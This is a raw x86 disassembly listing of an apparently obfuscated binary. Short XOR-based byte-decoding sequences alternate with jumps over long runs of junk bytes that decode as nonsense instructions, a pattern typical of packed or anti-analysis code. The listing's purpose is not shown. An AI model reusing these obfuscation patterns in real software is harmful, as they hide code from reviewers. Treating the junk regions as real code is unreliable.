  404710:	mov    edx,DWORD PTR [ebp-0x2c]
  404713:	xor    eax,edi
  404715:	shl    ecx,0x1e
  404718:	xor    edx,edx
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	mov    al,0x5b
  404772:	clc    
  404773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404774:	mov    esi,0xbdbebe03
  404779:	les    edi,FWORD PTR [esi-0x5c01b042]
  40477f:	xchg   ebx,eax
  404780:	or     BYTE PTR [esi],al
  404782:	push   ds
  404783:	mov    dh,BYTE PTR ds:0xb6a1a339
  404789:	rcr    BYTE PTR [eax+0x31024a6a],cl
  40478f:	fisttp QWORD PTR [esi+edx*8]
  404792:	fsubr  QWORD PTR [ecx+0x45a48d00]
  404798:	div    DWORD PTR [edx+0x5a]
  40479b:	mov    esi,DWORD PTR [edx+0x1a]
  40479e:	(bad)  
  40479f:	je     0x404764
  4047a1:	call   0xf661:0x4d4e859f
  4047a8:	in     eax,dx
  4047a9:	test   eax,0x27bf483f
  4047ae:	jmp    0x8103:0xce469f5a
  4047b5:	shr    ecx,cl
  4047b7:	cs push esi
  4047b9:	scas   al,BYTE PTR es:[edi]
  4047ba:	mov    WORD PTR [ecx+0x4fa8af22],es
  4047c0:	jl     0x40481a
  4047c2:	in     eax,dx
  4047c3:	xor    eax,0x21296a96
  4047c8:	into   
  4047c9:	fs push edi
  4047cb:	in     al,0xbd
  4047cd:	popf   
  4047ce:	outs   dx,BYTE PTR ds:[esi]
  4047cf:	aaa    
  4047d0:	ror    DWORD PTR [ebp+0x16d33efb],cl
  4047d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047d7:	or     al,0x8d
  4047d9:	sar    eax,cl
  4047db:	out    dx,al
  4047dc:	dec    ebx
  4047dd:	fist   DWORD PTR [ebx-0x1f]
  4047e0:	jae    0x4047c0
  4047e2:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4047e4:	nop
  4047e5:	loope  0x4047fd
  4047e7:	jb     0x40480f
  4047e9:	gs aam 0xd7
  4047ec:	cmp    DWORD PTR [ebx-0x77],ebp
  4047ef:	jl     0x40483d
  4047f1:	jmp    0x93ba:0x82d01a63
  4047f8:	test   al,0x41
  4047fa:	scas   eax,DWORD PTR es:[edi]
  4047fb:	mov    al,bh
  4047fd:	sti    
  4047fe:	int3   
  4047ff:	jbe    0x4047bd
  404801:	xchg   ecx,eax
  404802:	adc    DWORD PTR [edi+0x21ded49c],0x6e
  404809:	test   al,0xf8
  40480b:	imul   ecx,esp,0x27
  40480e:	jns    0x404857
  404810:	jmp    0x3f0a:0xd5127aab
  404817:	setbe  BYTE PTR [esi-0x4e]
  40481b:	out    dx,al
  40481c:	push   edx
  40481d:	dec    esp
  40481e:	neg    BYTE PTR [ecx+0x57]
  404821:	sub    BYTE PTR [esi+0x10],bl
  404824:	popf   
  404825:	jl     0x404876
  404827:	mov    cl,0xb0
  404829:	rol    BYTE PTR [ebx-0x4f],1
  40482c:	lea    edi,[edx]
  40482e:	xor    DWORD PTR [esi+0x70],edx
  404831:	repz mov ecx,cr6
  404835:	lahf   
  404836:	sub    dl,BYTE PTR [edx+0x3f]
  404839:	bound  ebx,QWORD PTR [ecx+0x23]
  40483c:	sbb    ecx,DWORD PTR [edx+0x0]
  40483f:	push   edi
  404841:	jecxz  0x4048c2
  404843:	pop    ds
  404844:	inc    ebx
  404845:	push   esp
  404846:	sub    bl,BYTE PTR [ebx+0x73]
  404849:	cmp    eax,0x1710ddeb
  40484e:	dec    ecx
  40484f:	ret    
  404850:	ret    
  404851:	ret    
  404852:	lock popa 
  404854:	fnsetpm(287 only) 
  404856:	scas   eax,DWORD PTR es:[edi]
  404857:	mov    esp,0x50ed762d
  40485c:	xchg   ebx,eax
  40485d:	jecxz  0x40480c
  40485f:	sub    DWORD PTR [ebp-0x5b],esp
  404862:	call   0x16fc2b8
  404867:	test   eax,0x23b3738d
  40486c:	mov    cl,0x54
  40486e:	jg     0x4048c7
  404870:	fdiv   QWORD PTR [eax+0x62]
  404873:	and    esp,esi
  404875:	nop
  404876:	or     edi,ecx
  404878:	sbb    DWORD PTR [edx-0xc84178d],esp
  40487e:	mov    ch,0xcc
  404880:	jnp    0x4048f3
  404882:	out    dx,eax
  404883:	je     0x4048ab
  404885:	nop
  404886:	push   ds
  404887:	aas    
  404888:	imul   edx,DWORD PTR [edx+ebx*1+0x4d5758c0],0xb7c85a22
  404893:	xor    eax,DWORD PTR [edi-0x417c10bd]
  404899:	stos   BYTE PTR es:[edi],al
  40489a:	sub    ecx,ebp
  40489c:	dec    ebp
  40489d:	pop    eax
  40489e:	push   esi
  40489f:	cmp    dl,bh
  4048a1:	xchg   edx,eax
  4048a2:	cli    
  4048a3:	mov    ?,WORD PTR [edi]
  4048a5:	cmc    
  4048a6:	(bad)  
  4048a7:	mov    al,ds:0x169d8046
  4048ac:	fmul   QWORD PTR [ebx-0x3c7b09f]
  4048b2:	iret   
  4048b3:	mov    WORD PTR [esi+0x7ea9b096],es
  4048b9:	mov    bl,0x9c
  4048bb:	dec    ebp
  4048bc:	mov    dh,0x93
  4048be:	int3   
  4048bf:	mov    ebp,0xc3187f00
  4048c4:	or     BYTE PTR [esi+0x10],0x42
  4048c8:	jae    0x4048ba
  4048ca:	call   0x2c94:0xf3c38139
  4048d1:	ja     0x40488c
  4048d3:	sub    al,0xe7
  4048d5:	dec    ebx
  4048d6:	cmp    edx,DWORD PTR [eax-0x52]
  4048d9:	sub    ch,BYTE PTR [esp+ebx*2]
  4048dc:	cld    
  4048dd:	jp     0x404949
  4048df:	mov    ds:0x544fe9d9,al
  4048e4:	(bad)  
  4048e5:	frstor [eax-0x7b]
  4048e8:	gs add al,0x8c
  4048eb:	(bad)  
  4048ec:	sbb    BYTE PTR [esi+0x2dc5b8b],dh
  4048f2:	inc    ecx
  4048f3:	jb     0x4048a3
  4048f5:	or     DWORD PTR [ebp+0x3f],ebp
  4048f8:	scas   eax,DWORD PTR es:[edi]
  4048f9:	xchg   bl,dh
  4048fb:	cmp    al,0x13
  4048fd:	xchg   ebx,eax
  4048fe:	loope  0x40496b
  404900:	jg     0x40491f
  404902:	mov    DWORD PTR [edx+ebx*1+0x49609871],edi
  404909:	call   0x3650:0xfb66d474
  404910:	les    esp,FWORD PTR [esp+edi*4+0x336f9b9c]
  404917:	neg    BYTE PTR [ecx-0x3f]
  40491a:	or     BYTE PTR [ebp+ebx*1-0x40],0xc
  40491f:	and    cl,BYTE PTR [edx+esi*8+0x54]
  404923:	enter  0xf3a5,0x87
  404927:	std    
  404928:	ins    BYTE PTR es:[edi],dx
  404929:	dec    eax
  40492a:	jnp    0x4048b7
  40492c:	mov    cl,0x3
  40492e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40492f:	mov    ecx,0x51e3c402
  404934:	jnp    0x404942
  404936:	inc    edi
  404937:	nop    esi
  40493a:	mov    gs,esi
  40493c:	add    eax,esp
  40493e:	xchg   ecx,esi
  404940:	sbb    dl,BYTE PTR [edi+ebp*1+0x2b]
  404944:	jo     0x404979
  404946:	out    0x9f,al
  404948:	push   es
  404949:	push   eax
  40494a:	fs push edx
  40494c:	adc    bl,BYTE PTR [eax-0x4a]
  40494f:	dec    ebp
  404950:	mov    ds:0xfe0e8147,eax
  404955:	and    ebx,DWORD PTR [ebx+0x5a]
  404958:	or     eax,0x3f82ddfd
  40495d:	inc    edx
  40495e:	dec    edi
  40495f:	sbb    dh,BYTE PTR [edi+0xc]
  404962:	adc    ch,BYTE PTR ds:0xb182b4cd
  404968:	inc    ebp
  404969:	pop    ebp
  40496a:	cld    
  40496b:	scas   eax,DWORD PTR es:[edi]
  40496c:	ds cld 
  40496e:	add    bh,BYTE PTR [eax+0x2f]
  404971:	jg     0x404965
  404973:	pop    edx
  404974:	and    bh,0xa6
  404977:	add    eax,0xb97c9484
  40497c:	arpl   bp,si
  40497e:	cli    
  40497f:	fld    DWORD PTR ds:0x494878dc
  404985:	ins    WORD PTR es:[edi],dx
  404987:	cmc    
  404988:	nop
  404989:	adc    BYTE PTR [ebp-0x57],bh
  40498c:	out    dx,eax
  40498d:	cs xchg esp,eax
  40498f:	pushf  
  404990:	ins    BYTE PTR es:[edi],dx
  404991:	mov    es,WORD PTR [esi+0x4]
  404994:	inc    edx
  404995:	inc    ebp
  404996:	and    esi,ebp
  404998:	xlat   BYTE PTR ds:[ebx]
  404999:	xlat   BYTE PTR ds:[ebx]
  40499a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499b:	sub    bh,bl
  40499d:	sbb    BYTE PTR [edx-0x10],ah
  4049a0:	ror    DWORD PTR [esi],cl
  4049a2:	shr    BYTE PTR [edi-0xb],1
  4049a5:	push   0x1b252ebf
  4049aa:	stc    
  4049ab:	adc    eax,DWORD PTR [ebx]
  4049ad:	cmc    
  4049ae:	mov    eax,ds:0xa2110b58
  4049b3:	sub    eax,DWORD PTR ds:0xefff2fb8
  4049b9:	jae    0x40493b
  4049bb:	cdq    
  4049bc:	sub    esp,DWORD PTR [edi]
  4049be:	lds    edx,FWORD PTR [edx-0x62]
  4049c1:	dec    edi
  4049c2:	mov    cs,esp
  4049c4:	pop    edx
  4049c5:	clc    
  4049c6:	mov    ch,0x55
  4049c8:	rcr    DWORD PTR [edx],cl
  4049ca:	icebp  
  4049cb:	fisub  WORD PTR [ebx]
  4049cd:	xchg   esi,eax
  4049ce:	xchg   BYTE PTR [edx-0x23ae8360],dh
  4049d4:	dec    ecx
  4049d5:	cmp    al,0x9c
  4049d7:	fcmovnb st,st(5)
  4049d9:	add    BYTE PTR [eax+0x1cdc38b5],0x6b
  4049e0:	or     DWORD PTR [ebx],edi
  4049e2:	or     ebx,ebp
  4049e4:	dec    esi
  4049e5:	rcl    BYTE PTR [ecx+0x64],0xd2
  4049e9:	shr    DWORD PTR ss:[edx],cl
  4049ec:	jmp    0x2d140b08
  4049f1:	mov    cl,BYTE PTR [esi+edi*2]
  4049f4:	mov    esi,DWORD PTR [edx-0x656f7238]
  4049fa:	ficomp WORD PTR [ecx+ebp*1]
  4049fd:	lahf   
  4049fe:	dec    ebp
  4049ff:	repz out 0xd,al
  404a02:	jmp    0x404a33
  404a04:	icebp  
  404a05:	add    eax,0x4f334dc6
  404a0a:	and    BYTE PTR [esi-0x3d23ab35],cl
  404a10:	sbb    dl,dh
  404a12:	cld    
  404a13:	dec    ecx
  404a14:	(bad)  
  404a15:	xchg   ebp,eax
  404a16:	pop    ss
  404a17:	and    ah,BYTE PTR [ecx]
  404a19:	push   ds
  404a1a:	outs   dx,DWORD PTR ds:[esi]
  404a1b:	jge    0x4049fe
  404a1d:	mov    ah,0xec
  404a1f:	pusha  
  404a20:	add    BYTE PTR [edx-0x4],bh
  404a23:	iret   
  404a24:	inc    ebx
  404a25:	mov    eax,0x16c5914
  404a2a:	inc    esp
  404a2b:	inc    eax
  404a2c:	inc    edx
  404a2d:	mov    ebx,0x66494a37
  404a32:	stos   DWORD PTR es:[edi],eax
  404a33:	in     al,0x53
  404a35:	icebp  
  404a36:	push   esp
  404a37:	jne    0x4049d5
  404a39:	or     eax,0xf8f1b7f4
  404a3e:	cs mov WORD PTR gs:[ebx+0x57],fs
  404a43:	mov    dl,0xf0
  404a45:	sti    
  404a46:	mov    dl,0xa1
  404a48:	xor    DWORD PTR [eax-0x75],eax
  404a4b:	loop   0x404a93
  404a4d:	jmp    0xfc384fbe
  404a52:	adc    BYTE PTR [esi+0x4b1e3555],dl
  404a58:	xor    eax,0xd99501dd
  404a5d:	cmp    DWORD PTR [eax-0xc402fee],ebx
  404a63:	jecxz  0x404a4c
  404a65:	fisttp WORD PTR [esp+esi*1]
  404a68:	test   al,0x1b
  404a6a:	push   ebp
  404a6b:	mov    ebp,0xf95155db
  404a70:	mov    ds:0xb0fc318b,eax
  404a75:	shr    DWORD PTR [ecx+0x7bc646d9],1
  404a7b:	jbe    0x404a3a
  404a7d:	pop    esi
  404a7e:	mov    esi,0xf7433fe9
  404a83:	dec    esi
  404a84:	call   0xbb45:0xa2ebf270
  404a8b:	or     DWORD PTR [ecx+0x7a],esi
  404a8e:	jle    0x404a4b
  404a90:	call   0x5ddd:0xec0b91d7
  404a97:	push   cs
  404a98:	inc    ebx
  404a99:	enter  0x655c,0x81
  404a9d:	or     DWORD PTR [edi+0x52],edx
  404aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aa1:	cmc    
  404aa2:	fsubr  DWORD PTR [eax+0x49]
  404aa6:	jmp    0xedea:0x2786a731
  404aad:	add    ch,BYTE PTR [ebx]
  404aaf:	or     ah,ah
  404ab1:	xchg   ecx,eax
  404ab2:	jle    0x404a9b
  404ab4:	jg     0x404b13
  404ab6:	sub    DWORD PTR [ebx+0x5234895e],edx
  404abc:	mov    ch,0xae
  404abe:	sar    esp,0xcd
  404ac1:	adc    eax,0x5451ab90
  404ac6:	pop    ebp
  404ac7:	sub    DWORD PTR [esi-0x137065ed],ecx
  404acd:	add    BYTE PTR [eax+0x27aade10],cl
  404ad3:	sti    
  404ad4:	nop
  404ad5:	arpl   WORD PTR [eax],sp
  404ad7:	(bad)  
  404ad8:	mov    dh,0xc7
  404ada:	cmp    BYTE PTR [edi+0x2b8f7a59],ch
  404ae0:	imul   edx,DWORD PTR [edi],0xfe822753
  404ae6:	mov    dh,0xa7
  404ae8:	jp     0x404a91
  404aea:	mov    WORD PTR [eax+0x79fddd82],ss
  404af0:	jbe    0x404a8a
  404af2:	or     BYTE PTR [esi-0x22d87043],bh
  404af8:	loopne 0x404af0
  404afa:	popa   
  404afb:	and    eax,0xe66e32e7
  404b00:	shl    ecx,0x1e
  404b03:	xor    edx,edx
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	mov    cl,0xd1
  404b3a:	add    al,0xdd
  404b3c:	mov    ebp,0xbdbebe09
  404b41:	les    edi,FWORD PTR [esi-0x32d5ba42]
  404b47:	mov    WORD PTR [eax+0x56],?
  404b4a:	mov    ecx,0x739e9e93
  404b4f:	retf   0xd0d6
  404b52:	cwde   
  404b53:	or     al,0x0
  404b55:	add    al,0xd2
  404b57:	and    al,0xdd
  404b59:	not    BYTE PTR [ebp+0x6e]
  404b5c:	test   eax,edx
  404b5e:	xchg   ecx,eax
  404b5f:	arpl   WORD PTR ds:0x71c5b61f,ax
  404b65:	test   al,0x1a
  404b67:	xchg   edi,eax
  404b68:	in     eax,dx
  404b69:	push   cs
  404b6a:	inc    edi
  404b6b:	repnz add dh,BYTE PTR [ebx-0xbd1bfd]
  404b72:	jne    0x404b85
  404b74:	ror    BYTE PTR [edi],cl
  404b76:	cmp    BYTE PTR [ebx+0x45],0xbc
  404b7a:	aam    0xff
  404b7c:	cmp    ah,BYTE PTR [ebp-0x260fa23]
  404b82:	out    0x66,eax
  404b84:	or     ebx,ecx
  404b86:	or     ecx,DWORD PTR [eax-0x1f4590fe]
  404b8c:	lods   eax,DWORD PTR ds:[esi]
  404b8d:	sub    dh,al
  404b8f:	xlat   BYTE PTR ds:[ebx]
  404b90:	mov    bl,0xb0
  404b92:	add    DWORD PTR [edi+0x50],ebx
  404b95:	add    ebx,DWORD PTR [eax+0x542ba726]
  404b9b:	inc    ecx
  404b9c:	mov    dl,0x80
  404b9e:	loop   0x404bca
  404ba0:	in     eax,dx
  404ba1:	test   eax,0x55e3ed6a
  404ba6:	sbb    dl,BYTE PTR [ebx+0x77]
  404ba9:	pop    ebx
  404baa:	xor    dl,BYTE PTR [eax+0xcab70fb]
  404bb0:	jno    0x404be2
  404bb2:	push   ss
  404bb3:	arpl   WORD PTR [ebx-0x30],cx
  404bb6:	(bad)  
  404bb8:	or     esi,DWORD PTR [ecx]
  404bba:	and    BYTE PTR [ebp-0x3d],0x20
  404bbe:	popa   
  404bbf:	into   
  404bc0:	test   DWORD PTR [eax+0x48],0x848f61e6
  404bc7:	mov    ds:0xc817545a,al
  404bcc:	(bad)  
  404bce:	push   eax
  404bcf:	sti    
  404bd0:	add    eax,eax
  404bd2:	outs   dx,BYTE PTR ds:[esi]
  404bd3:	sub    DWORD PTR [eax-0x2e9bfb72],eax
  404bd9:	inc    esi
  404bda:	lds    eax,FWORD PTR [ebx+ebx*2-0x35a90296]
  404be1:	shr    edx,0x38
  404be4:	jecxz  0x404bd9
  404be6:	xor    ah,ch
  404be8:	ins    DWORD PTR es:[edi],dx
  404be9:	mov    al,0xbc
  404beb:	and    edi,DWORD PTR ds:0xe7d0fadb
  404bf1:	xchg   ecx,eax
  404bf2:	add    eax,0x85a625a4
  404bf7:	dec    eax
  404bf8:	sbb    DWORD PTR [ebx-0x56],esi
  404bfb:	std    
  404bfc:	cwde   
  404bfd:	jbe    0x404c4b
  404bff:	or     DWORD PTR ds:0x849ad58c,0x45
  404c06:	xor    dh,ch
  404c08:	jo     0x404c6f
  404c0a:	test   eax,0x46027366
  404c0f:	mov    ebx,ebp
  404c11:	outs   dx,BYTE PTR ds:[esi]
  404c12:	mov    dh,0x4e
  404c14:	imul   ch
  404c16:	sub    eax,0xc54ba9cd
  404c1b:	iret   
  404c1c:	dec    esi
  404c1d:	(bad)  
  404c1e:	or     al,0x11
  404c20:	mul    bh
  404c22:	mov    edi,0x8dd32e40
  404c27:	stos   DWORD PTR es:[edi],eax
  404c28:	pusha  
  404c29:	outs   dx,BYTE PTR ds:[esi]
  404c2a:	div    BYTE PTR [edx]
  404c2c:	imul   ebx,DWORD PTR [ecx+0x38cc34d0],0xabad20d5
  404c36:	outs   dx,BYTE PTR ds:[esi]
  404c37:	shl    BYTE PTR [ecx+0x7c],cl
  404c3a:	dec    ebp
  404c3b:	inc    ecx
  404c3c:	dec    esi
  404c3d:	sbb    ah,ch
  404c3f:	addr16 pop esp
  404c41:	add    eax,0xd307a396
  404c46:	(bad)  
  404c47:	les    esp,FWORD PTR [edx]
  404c49:	stos   DWORD PTR es:[edi],eax
  404c4a:	jl     0x404c30
  404c4c:	call   0x4a54:0x6723f41a
  404c53:	mov    DWORD PTR [ebx-0x6],edx
  404c56:	fsubp  st(7),st
  404c58:	sub    esp,DWORD PTR [edx-0x35603103]
  404c5e:	ret    
  404c5f:	(bad)  
  404c60:	mov    ah,0xbc
  404c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c63:	leave  
  404c64:	push   cs
  404c65:	xchg   BYTE PTR [ebp-0x5eba371b],ch
  404c6b:	icebp  
  404c6c:	pop    ebx
  404c6d:	fcomp  st(5)
  404c6f:	cmp    eax,0x88a7e00e
  404c74:	shr    BYTE PTR [ebx-0x3fbebc64],1
  404c7a:	xchg   DWORD PTR [esi-0x52],edx
  404c7d:	mov    BYTE PTR [ecx-0x5dc13a5],cl
  404c83:	cwde   
  404c84:	lock mov edx,0x502c1d1c
  404c8a:	jb     0x404ced
  404c8c:	or     bh,al
  404c8e:	inc    esi
  404c8f:	cs add al,0x6b
  404c92:	je     0x404ca9
  404c94:	mov    fs,WORD PTR [eax]
  404c96:	cli    
  404c97:	lahf   
  404c98:	outs   dx,BYTE PTR ds:[esi]
  404c9a:	or     dh,cl
  404c9c:	pop    edx
  404c9d:	fnstenv [edi+0x2eb55890]
  404ca3:	adc    eax,0xac230a0
  404ca8:	sub    ebx,DWORD PTR [edi+eax*8+0x10]
  404cac:	jmp    0x5820:0xdad5c22d
  404cb3:	stc    
  404cb4:	pop    edx
  404cb5:	push   ebp
  404cb6:	or     eax,0xa27ab02d
  404cbb:	aaa    
  404cbc:	lock cmp BYTE PTR [eax],al
  404cbf:	icebp  
  404cc0:	sbb    DWORD PTR [ebx+eax*4+0x66],ebx
  404cc4:	pop    edi
  404cc5:	jmp    0xa0441dc
  404cca:	jnp    0x404c69
  404ccc:	cmp    edi,DWORD PTR [esi-0x51e3df73]
  404cd2:	sbb    eax,0xc35f3359
  404cd7:	test   dh,ch
  404cd9:	fdiv   QWORD PTR [edx+0x334743c0]
  404cdf:	dec    edi
  404ce0:	mov    eax,edx
  404ce2:	shl    BYTE PTR [ecx-0x2851c64e],0xb7
  404ce9:	xchg   esp,eax
  404cea:	or     eax,0x2c2e3aa1
  404cef:	cmp    eax,DWORD PTR [ecx+0x32d188c3]
  404cf5:	dec    edi
  404cf6:	sbb    bh,BYTE PTR [eax+eiz*8+0x56]
  404cfa:	pop    esp
  404cfb:	xor    DWORD PTR [edi],edi
  404cfd:	call   0x828fde1
  404d02:	or     esp,DWORD PTR [ecx+0x64]
  404d05:	hlt    
  404d06:	and    al,0x1d
  404d08:	xor    BYTE PTR [edi-0x33],cl
  404d0b:	rcl    ebp,cl
  404d0d:	mov    eax,0xf8a61c34
  404d12:	mov    ebx,0x1429a36c
  404d17:	ret    0x1199
  404d1a:	pusha  
  404d1b:	and    cl,al
  404d1d:	xor    al,0x1b
  404d1f:	add    ebp,edi
  404d21:	inc    ebx
  404d22:	data16 add bh,bh
  404d25:	inc    ebp
  404d26:	mov    ebx,0xb4a2c7f9
  404d2b:	dec    esi
  404d2c:	loop   0x404d72
  404d2e:	xchg   bl,al
  404d30:	jne    0x404d99
  404d32:	add    eax,0x6cc9162e
  404d37:	mov    ah,0x21
  404d39:	pushf  
  404d3a:	lods   eax,DWORD PTR ds:[esi]
  404d3b:	aas    
  404d3c:	add    BYTE PTR ds:0xcae862fb,dl
  404d42:	fwait
  404d43:	adc    dl,BYTE PTR [ecx+0x44]
  404d46:	fs mov ebp,0x3c34d9c2
  404d4c:	fcomi  st,st(2)
  404d4e:	jbe    0x404d86
  404d50:	or     al,0xf2
  404d52:	stc    
  404d53:	mov    ecx,0x64082242
  404d58:	push   es
  404d59:	cmp    al,0xde
  404d5b:	rcr    DWORD PTR ds:0x278d2fb2,cl
  404d61:	fisttp WORD PTR [ebx-0x197df3e4]
  404d67:	mov    eax,ds:0xaff1341b
  404d6c:	push   ebx
  404d6d:	push   ebx
  404d6e:	and    BYTE PTR [edi+0x5101b64c],ch
  404d74:	movsx  edx,BYTE PTR [ebx+0x12704464]
  404d7b:	call   FWORD PTR [edx+edx*4+0x6195e6be]
  404d82:	int    0xd9
  404d84:	inc    esp
  404d85:	ja     0x404d3e
  404d87:	mov    edi,0xdd499aa5
  404d8c:	sub    eax,edx
  404d8e:	das    
  404d8f:	sub    BYTE PTR [edi-0x6f28e6d0],dh
  404d95:	xor    ch,BYTE PTR [eax-0x7e14a875]
  404d9b:	aas    
  404d9c:	jge    0x404daf
  404d9e:	sub    ecx,DWORD PTR [ebx+edi*4+0x64]
  404da2:	and    DWORD PTR [edi-0x35],ecx
  404da5:	xchg   ebp,eax
  404da6:	or     al,ah
  404da8:	cmp    eax,0x798d5f5a
  404dad:	lock in al,dx
  404daf:	outs   dx,BYTE PTR ds:[esi]
  404db0:	xchg   edx,eax
  404db1:	fbld   TBYTE PTR [edi+0x7dd9ec55]
  404db7:	pop    ds
  404db8:	pop    edx
  404db9:	adc    BYTE PTR [ebp-0x43],dl
  404dbc:	xchg   sp,ax
  404dbe:	sbb    eax,0x4bef1dfd
  404dc3:	mov    dh,0xef
  404dc5:	jo     0x404da2
  404dc7:	pop    ecx
  404dc8:	mov    BYTE PTR [ecx+0x2c],bl
  404dcb:	sub    BYTE PTR [ebp+0x647da167],dh
  404dd1:	popf   
  404dd2:	out    dx,eax
  404dd3:	jnp    0x404e06
  404dd5:	push   edi
  404dd6:	cmp    esp,DWORD PTR [edi]
  404dd8:	jmp    0xc52371f9
  404ddd:	cmp    al,0x16
  404ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404de0:	pop    esp
  404de1:	fbld   TBYTE PTR [edx]
  404de3:	xchg   edi,eax
  404de4:	and    DWORD PTR [ebp+0x7],edx
  404de7:	test   al,0xd1
  404de9:	mov    esi,0x13b59d49
  404dee:	loopne 0x404d87
  404df0:	pop    eax
  404df1:	retf   0x997b
  404df4:	dec    ebp
  404df5:	add    ch,BYTE PTR [ebx+esi*1-0x12]
  404df9:	mov    eax,ds:0x8eaf8eab
  404dfe:	xor    cl,BYTE PTR [ebp+esi*1+0x3f6cd8a6]
  404e05:	add    BYTE PTR [ecx],ah
  404e07:	scas   eax,DWORD PTR es:[edi]
  404e08:	stos   BYTE PTR es:[edi],al
  404e09:	or     al,0xcb
  404e0b:	iret   
  404e0c:	push   esi
  404e0d:	cmc    
  404e0e:	xor    al,0xf5
  404e10:	div    BYTE PTR [ecx-0x64]
  404e13:	nop
  404e14:	aas    
  404e15:	jbe    0x404dbb
  404e17:	mov    BYTE PTR [edx+0x46],ch
  404e1a:	mov    cl,0x45
  404e1c:	push   ecx
  404e1d:	ret    
  404e1e:	cmp    dh,bl
  404e20:	sub    al,0x75
  404e22:	je     0x404daa
  404e24:	outs   dx,DWORD PTR ds:[esi]
  404e25:	out    dx,eax
  404e26:	cs retf 
  404e28:	mov    ds:0x54852586,eax
  404e2d:	call   0xc3a7:0x7136085d
  404e34:	xchg   edx,eax
  404e35:	cwde   
  404e36:	neg    eax
  404e38:	clc    
  404e39:	gs pop eax
  404e3b:	clc    
  404e3c:	mov    DWORD PTR [edi+0x4b3fd9e],ebp
  404e42:	mov    dl,0xf9
  404e44:	daa    
  404e45:	mov    bl,0x10
  404e47:	jg     0x404dca
  404e49:	(bad)  
  404e4a:	pop    ecx
  404e4b:	nop
  404e4c:	sti    
  404e4d:	sub    cl,BYTE PTR [eax-0x2e]
  404e50:	jge    0x404eb4
  404e52:	cmp    BYTE PTR ds:0x3533af1b,dh
  404e58:	loope  0x404e3f
  404e5a:	or     dl,al
  404e5c:	int    0xa5
  404e5e:	mov    esi,edx
  404e60:	jno    0x404e7f
  404e62:	inc    ebx
  404e63:	cmp    BYTE PTR [edx+0xe],bl
  404e66:	or     cl,BYTE PTR [edx]
  404e68:	xchg   esi,eax
  404e69:	jne    0x404e00
  404e6b:	in     eax,dx
  404e6c:	mov    BYTE PTR [esi+0x6ac03d2c],al
  404e72:	pop    esp
  404e73:	loop   0x404e91
  404e75:	xchg   eax,ebx
  404e77:	inc    edx
  404e78:	shl    eax,cl
  404e7a:	test   al,0x12
  404e7c:	shr    cl,0xe5
  404e7f:	test   eax,0x2cbcaf5f
  404e84:	add    eax,0xf42ee101
  404e89:	jno    0x404e1a
  404e8b:	push   es
  404e8c:	mov    ah,0x33
  404e8e:	pop    ecx
  404e8f:	mov    ds:0xcd8bb966,al
  404e94:	scas   al,BYTE PTR es:[edi]
  404e95:	sbb    eax,0xa4f5605b
  404e9a:	xlat   BYTE PTR ds:[ebx]
  404e9b:	int3   
  404e9c:	xor    DWORD PTR [ebx-0x1558e63c],0xfcd4f07c
  404ea6:	aam    0xf2
  404ea8:	ficomp DWORD PTR [ecx-0x39]
  404eab:	jle    0x404e4b
  404ead:	ins    DWORD PTR es:[edi],dx
  404eae:	cmp    al,0x1b
  404eb0:	mov    dl,0xdc
  404eb2:	jl     0x404edc
  404eb4:	xchg   DWORD PTR [eax-0x5e],ebx
  404eb7:	fstp   DWORD PTR [eax]
  404eb9:	aaa    
  404eba:	add    al,0x6b
  404ebc:	push   ebx
  404ebd:	fbstp  TBYTE PTR [esp+ebp*2-0x2e]
  404ec1:	stos   BYTE PTR es:[edi],al
  404ec2:	xchg   esp,eax
  404ec3:	and    al,0x30
  404ec5:	dec    ebx
  404ec6:	mov    dh,0x3e
  404ec8:	xor    eax,edi
  404eca:	xor    edx,edx
  404ecc:	or     eax,edx
  404ece:	mov    cl,BYTE PTR [eax+ecx*1]
  404ed1:	mov    eax,DWORD PTR [ebp-0x34]
  404ed4:	or     BYTE PTR [eax],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
